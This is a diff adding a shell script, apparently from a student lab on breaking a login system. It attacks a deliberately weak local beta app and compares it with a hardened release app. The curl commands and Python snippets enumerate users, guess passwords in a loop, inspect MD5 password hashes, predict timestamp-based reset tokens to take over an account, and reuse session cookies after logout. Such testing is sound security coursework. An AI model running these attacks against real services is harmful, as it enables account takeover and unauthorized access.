@@ -1,0 +1,125 @@
+# AuthX Security Testing
+# Proiect: Break the Login
+
+# SETUP
+# Terminal 1: cd webapp_beta && python3 app_beta.py
+# Terminal 2: cd webapp_release && python3 app_release.py
+
+# 1A
+curl -s -X POST http://localhost:5001/register -H "Accept: application/json" -d "email=victim@authx.com&password=1&role=ANALYST"
+
+# 1B
+curl -s -X POST http://localhost:5001/register -H "Accept: application/json" -d "email=attacker@authx.com&password=abc&role=MANAGER"
+
+# 1C
+curl -s -X POST http://localhost:5002/register -H "Accept: application/json" -d "email=victim@authx.com&password=1"
+
+# 1D
+curl -s -X POST http://localhost:5002/register -H "Accept: application/json" -d "email=victim@authx.com&password=Secure123"
+
+
+# 2A
+curl -s -X POST http://localhost:5001/login -H "Accept: application/json" -d "email=ghost@notexist.xyz&password=anything"
+
+# 2B
+curl -s -X POST http://localhost:5001/login -H "Accept: application/json" -d "email=victim@authx.com&password=gresit"
+
+# 2C
+curl -s -X POST http://localhost:5002/login -H "Accept: application/json" -d "email=ghost@notexist.xyz&password=anything"
+
+curl -s -X POST http://localhost:5002/login -H "Accept: application/json" -d "email=victim@authx.com&password=gresit"
+
+
+# 3A
+curl -v -s -X POST http://localhost:5001/login -H "Accept: application/json" -d "email=victim@authx.com&password=1" -c beta_victim.txt 2>&1 | grep -i "set-cookie"
+
+# 3B
+curl -v -s -X POST http://localhost:5002/login -H "Accept: application/json" -d "email=victim@authx.com&password=Secure123" -c release_victim.txt 2>&1 | grep -i "set-cookie"
+
+
+# 4A
+curl -s -X POST http://localhost:5001/login -H "Accept: application/json" -d "email=victim@authx.com&password=1" -c beta_victim.txt
+
+# 4B
+curl -s http://localhost:5001/dashboard -H "Accept: application/json" -b beta_victim.txt
+
+# 4C
+curl -s -X POST http://localhost:5001/login -H "Accept: application/json" -d "email=attacker@authx.com&password=abc" -c beta_attacker.txt
+
+
+# 5A
+for pw in password 123456 admin qwerty letmein abc 1 test; do
+  echo -n "parola '$pw' => "
+  curl -s -X POST http://localhost:5001/login -H "Accept: application/json" -d "email=victim@authx.com&password=$pw"
+  echo
+done
+
+# 5B
+for i in $(seq 1 7); do
+  echo "--- Tentativa $i ---"
+  curl -s -X POST http://localhost:5002/login -H "Accept: application/json" -d "email=victim@authx.com&password=gresit$i"
+  echo
+done
+
+# 5C
+curl -s -X POST http://localhost:5002/login -H "Accept: application/json" -d "email=victim@authx.com&password=Secure123"
+
+
+# 6A
+python3 -c "
+import sqlite3, hashlib
+db = sqlite3.connect('webapp_beta/authx_beta.db')
+r = db.execute(\"SELECT email,password_hash FROM users WHERE email='victim@authx.com'\").fetchone()
+print('Email:', r[0])
+print('Hash:', r[1])
+print('MD5(1):', hashlib.md5(b'1').hexdigest())
+print('Match:', r[1] == hashlib.md5(b'1').hexdigest())
+"
+
+# 6B
+python3 -c "
+import sqlite3
+db = sqlite3.connect('webapp_release/authx_release.db')
+r = db.execute(\"SELECT email,password_hash FROM users WHERE email='victim@authx.com'\").fetchone()
+print('Email:', r[0])
+print('Hash:', r[1])
+print('bcrypt?', r[1].startswith('\$2b\$'))
+"
+
+
+# 7A
+curl -s -X POST http://localhost:5001/forgot-password -H "Accept: application/json" -d "email=victim@authx.com"
+
+# 7B
+TOKEN=$(python3 -c "import time; print(hex(int(time.time()))[2:])")
+echo "Token estimat: $TOKEN"
+curl -s -X POST http://localhost:5001/reset-password -H "Accept: application/json" -d "token=$TOKEN&password=hacked123"
+
+# 7C
+curl -s -X POST http://localhost:5001/reset-password -H "Accept: application/json" -d "token=$TOKEN&password=hacked_again456"
+
+# 7D
+curl -s -X POST http://localhost:5002/forgot-password -H "Accept: application/json" -d "email=victim@authx.com"
+TOKEN_GUESS=$(python3 -c "import time; print(hex(int(time.time()))[2:])")
+curl -s -X POST http://localhost:5002/reset-password -H "Accept: application/json" -d "token=$TOKEN_GUESS&password=Hacked123"
+
+
+# 8A
+curl -s http://localhost:5001/audit-logs -H "Accept: application/json" -b beta_victim.txt
+
+# 8B
+curl -s http://localhost:5002/audit-logs -H "Accept: application/json" -b release_victim.txt
+
+# 8C
+curl -s http://localhost:5001/audit-logs -H "Accept: application/json" -b beta_attacker.txt
+
+
+# 9A
+COOKIE=$(curl -s -X POST http://localhost:5001/login -H "Accept: application/json" -d "email=victim@authx.com&password=1" -c - | grep -oP 'session=\S+')
+curl -s http://localhost:5001/logout -H "Accept: application/json" --cookie "$COOKIE"
+curl -s http://localhost:5001/dashboard -H "Accept: application/json" --cookie "$COOKIE"
+
+# 9B
+COOKIE=$(curl -s -X POST http://localhost:5002/login -H "Accept: application/json" -d "email=victim@authx.com&password=Secure123" -c - | grep -oP 'session=\S+')
+curl -s http://localhost:5002/logout -H "Accept: application/json" --cookie "$COOKIE"
+curl -s http://localhost:5002/dashboard -H "Accept: application/json" --cookie "$COOKIE"
